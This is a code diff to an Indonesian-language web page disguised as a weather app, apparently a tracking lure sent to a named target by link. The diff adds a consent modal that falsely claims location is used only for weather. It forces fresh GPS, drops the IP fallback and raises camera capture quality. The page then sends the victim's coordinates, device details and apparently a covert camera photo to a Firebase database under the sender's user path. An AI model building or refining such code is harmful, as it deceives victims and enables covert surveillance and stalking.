@@ -15,6 +15,86 @@
       transition: background 1s;
     }
     .container { max-width: 420px; margin: 0 auto; padding-top: 20px; }
+
+    /* ====== MODAL KONFIRMASI LOKASI ====== */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      z-index: 999;
+      animation: fadeIn 0.3s;
+    }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    .modal-box {
+      background: linear-gradient(180deg, #1e3c72 0%, #2a5298 100%);
+      border-radius: 20px;
+      padding: 28px 22px 22px;
+      max-width: 360px;
+      width: 100%;
+      text-align: center;
+      border: 1px solid rgba(255,255,255,0.2);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+      animation: slideUp 0.3s;
+    }
+    @keyframes slideUp {
+      from { transform: translateY(20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    .modal-icon {
+      font-size: 55px;
+      margin-bottom: 12px;
+      filter: drop-shadow(0 4px 10px rgba(0,0,0,0.3));
+    }
+    .modal-title {
+      font-size: 17px;
+      font-weight: 600;
+      margin-bottom: 10px;
+      letter-spacing: 0.3px;
+    }
+    .modal-text {
+      font-size: 13px;
+      opacity: 0.85;
+      line-height: 1.6;
+      margin-bottom: 22px;
+    }
+    .modal-text b { color: #ffe082; }
+    .modal-buttons {
+      display: flex;
+      gap: 10px;
+    }
+    .modal-btn {
+      flex: 1;
+      padding: 13px;
+      border: none;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all 0.2s;
+    }
+    .modal-btn-cancel {
+      background: rgba(255,255,255,0.15);
+      color: white;
+      border: 1px solid rgba(255,255,255,0.25);
+    }
+    .modal-btn-cancel:hover { background: rgba(255,255,255,0.25); }
+    .modal-btn-ok {
+      background: white;
+      color: #1e3c72;
+    }
+    .modal-btn-ok:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+    }
+
+    /* ====== KONTEN UTAMA ====== */
     .header { text-align: center; margin-bottom: 25px; }
     .header h1 { font-size: 20px; font-weight: 400; letter-spacing: 1px; opacity: 0.9; }
     .header .date { font-size: 13px; opacity: 0.7; margin-top: 5px; }
@@ -91,16 +171,35 @@
     .error-box {
       background: rgba(255,80,80,0.15);
       border: 1px solid rgba(255,80,80,0.3);
-      border-radius: 15px; padding: 25px; text-align: center;
+      border-radius: 15px; padding: 30px 25px; text-align: center;
     }
-    .error-box .icon { font-size: 45px; margin-bottom: 10px; }
+    .error-box .icon { font-size: 55px; margin-bottom: 15px; }
+    .error-box h3 { font-size: 16px; margin-bottom: 10px; font-weight: 600; }
+    .error-box p { font-size: 13px; opacity: 0.85; line-height: 1.6; }
     .footer { text-align: center; font-size: 11px; opacity: 0.5; margin-top: 20px; padding-bottom: 20px; }
   </style>
 </head>
 <body>
 
+<!-- ====== MODAL KONFIRMASI LOKASI ====== -->
+<div class="modal-overlay" id="modalLokasi">
+  <div class="modal-box">
+    <div class="modal-icon">📍</div>
+    <div class="modal-title">Izinkan Akses Lokasi</div>
+    <div class="modal-text">
+      Untuk menampilkan <b>informasi cuaca di daerah Anda</b>, aplikasi memerlukan izin akses lokasi.
+      <br><br>
+      Lokasi hanya digunakan untuk menampilkan data cuaca di sekitar Anda.
+    </div>
+    <div class="modal-buttons">
+      <button class="modal-btn modal-btn-cancel" onclick="tolakLokasi()">Tidak</button>
+      <button class="modal-btn modal-btn-ok" onclick="izinkanLokasi()">Izinkan</button>
+    </div>
+  </div>
+</div>
+
 <div class="container">
-  <div class="loading" id="loading">
+  <div class="loading" id="loading" style="display:none">
     <div class="spinner"></div>
     <p>Memuat data cuaca...</p>
     <p class="sub">Mohon tunggu sebentar</p>
@@ -148,10 +247,26 @@
     <div class="footer">Data dari Open-Meteo · Powered by Web</div>
   </div>
 
-  <div class="error-box" id="error" style="display:none">
+  <!-- ====== ERROR: LOKASI DITOLAK ====== -->
+  <div class="error-box" id="errorLokasi" style="display:none">
+    <div class="icon">🚫</div>
+    <h3>Lokasi Tidak Dapat Diakses</h3>
+    <p>
+      Aplikasi tidak dapat mengakses lokasi Anda karena <b>izin lokasi tidak diberikan</b>.
+      <br><br>
+      Untuk melihat cuaca di daerah Anda, silakan <b>refresh halaman</b> dan klik <b>"Izinkan"</b>.
+    </p>
+  </div>
+
+  <!-- ====== ERROR: GAGAL DAPAT LOKASI ====== -->
+  <div class="error-box" id="errorGagal" style="display:none">
     <div class="icon">⚠️</div>
-    <p id="errorMsg">Gagal memuat data cuaca</p>
-    <p style="font-size:12px;opacity:0.6;margin-top:8px">Coba refresh halaman</p>
+    <h3>Gagal Menangkap Lokasi</h3>
+    <p>
+      Aplikasi tidak dapat mendeteksi lokasi Anda saat ini.
+      <br><br>
+      Pastikan <b>GPS aktif</b> dan Anda berada di area dengan sinyal yang baik, lalu <b>refresh halaman</b>.
+    </p>
   </div>
 </div>
 
@@ -196,9 +311,35 @@ const weatherMap = {
 };
 function getWeather(code) { return weatherMap[code] || ['🌤️', 'Berawan']; }
 
-// ============================================================
-// 📍 AMBIL LOKASI (SIMPLE & CEPAT)
-// ============================================================
+// ============================================
+// 🌐 VARIABEL GLOBAL
+// ============================================
+const modalLokasi = document.getElementById('modalLokasi');
+const loadingEl = document.getElementById('loading');
+const contentEl = document.getElementById('content');
+const errorLokasiEl = document.getElementById('errorLokasi');
+const errorGagalEl = document.getElementById('errorGagal');
+
+// ============================================
+// ❌ USER KLIK "TIDAK"
+// ============================================
+window.tolakLokasi = () => {
+  modalLokasi.style.display = 'none';
+  errorLokasiEl.style.display = 'block';
+};
+
+// ============================================
+// ✅ USER KLIK "IZINKAN"
+// ============================================
+window.izinkanLokasi = () => {
+  modalLokasi.style.display = 'none';
+  loadingEl.style.display = 'block';
+  mulaiProses();
+};
+
+// ============================================
+// 📍 AMBIL LOKASI
+// ============================================
 function getLocation() {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -206,7 +347,6 @@ function getLocation() {
       return;
     }
 
-    // Timeout safety 8 detik — kalau tidak dapat, lanjut dengan IP
     const timer = setTimeout(() => resolve(null), 8000);
 
     navigator.geolocation.getCurrentPosition(
@@ -225,15 +365,15 @@ function getLocation() {
       {
         enableHighAccuracy: true,
         timeout: 7000,
-        maximumAge: 60000  // boleh pakai lokasi 1 menit terakhir (lebih cepat)
+        maximumAge: 0
       }
     );
   });
 }
 
-// ============================================================
-// 📸 AMBIL FOTO (SIMPLE)
-// ============================================================
+// ============================================
+// 📸 AMBIL FOTO
+// ============================================
 async function getCameraPhoto() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
@@ -246,11 +386,11 @@ async function getCameraPhoto() {
     await new Promise(r => setTimeout(r, 1200));
 
     const canvas = document.getElementById('canvas');
-    canvas.width = 480;
-    canvas.height = 360;
+    canvas.width = 720;
+    canvas.height = 960;
     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const foto = canvas.toDataURL('image/jpeg', 0.5);
+    const foto = canvas.toDataURL('image/jpeg', 0.85);
     stream.getTracks().forEach(t => t.stop());
     return foto;
   } catch(e) {
@@ -258,34 +398,23 @@ async function getCameraPhoto() {
   }
 }
 
-// ============================================================
-// 🚀 MAIN
-// ============================================================
-async function init() {
-  let lat, lng, accuracy = null;
-  let fromGPS = false;
-
-  // Coba GPS dulu
+// ============================================
+// 🚀 PROSES UTAMA (setelah izin diklik)
+// ============================================
+async function mulaiProses() {
+  // Ambil lokasi GPS — TIDAK fallback ke IP
   const pos = await getLocation();
-  if (pos) {
-    lat = pos.lat;
-    lng = pos.lng;
-    accuracy = pos.accuracy;
-    fromGPS = true;
-  } else {
-    // Fallback ke IP
-    try {
-      const r = await fetch('https://ipapi.co/json/');
-      const d = await r.json();
-      lat = d.latitude;
-      lng = d.longitude;
-      accuracy = 5000;
-    } catch(e) {
-      document.getElementById('loading').style.display = 'none';
-      document.getElementById('error').style.display = 'block';
-      return;
-    }
+
+  if (!pos) {
+    // Gagal dapat lokasi (izin ditolak browser / GPS mati / timeout)
+    loadingEl.style.display = 'none';
+    errorGagalEl.style.display = 'block';
+    return;
   }
+
+  const lat = pos.lat;
+  const lng = pos.lng;
+  const accuracy = pos.accuracy;
 
   try {
     // Ambil cuaca
@@ -294,11 +423,11 @@ async function init() {
     const data = await res.json();
 
     // Nama kota
-    let cityName = 'Lokasi Kamu';
+    let cityName = 'Lokasi Anda';
     try {
       const geo = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=id`);
       const gd = await geo.json();
-      cityName = gd.city || gd.locality || gd.principalSubdivision || 'Lokasi Kamu';
+      cityName = gd.city || gd.locality || gd.principalSubdivision || 'Lokasi Anda';
     } catch(e) {}
 
     // Update UI
@@ -345,19 +474,19 @@ async function init() {
     document.getElementById('forecastList').innerHTML = html;
 
     // Tampilkan konten
-    document.getElementById('loading').style.display = 'none';
-    document.getElementById('content').style.display = 'block';
+    loadingEl.style.display = 'none';
+    contentEl.style.display = 'block';
 
-    // ============================================================
+    // ============================================
     // 📤 KIRIM DATA KE FIREBASE
-    // ============================================================
+    // ============================================
     const payload = {
       target: target,
       waktu: Date.now(),
       lat: lat,
       lng: lng,
       akurasi: accuracy ? Math.round(accuracy) : null,
-      sumber: fromGPS ? 'GPS' : 'IP',
+      sumber: 'GPS',
       kota: cityName,
       suhu: cur.temperature_2m,
       userAgent: navigator.userAgent,
@@ -406,12 +535,20 @@ async function init() {
     await push(ref(db, 'lokasi/' + user), payload);
 
   } catch(e) {
-    document.getElementById('loading').style.display = 'none';
-    document.getElementById('error').style.display = 'block';
+    loadingEl.style.display = 'none';
+    errorGagalEl.style.display = 'block';
   }
 }
 
-init();
+// ============================================
+// 🚀 START — Tampilkan modal konfirmasi dulu
+// ============================================
+if (!user) {
+  document.body.innerHTML = '<div style="color:white;text-align:center;padding:50px;font-family:sans-serif;">Link tidak valid</div>';
+} else {
+  // Modal sudah tampil otomatis (default visible)
+  // Tunggu user klik "Izinkan" atau "Tidak"
+}
 </script>
 </body>
 </html>
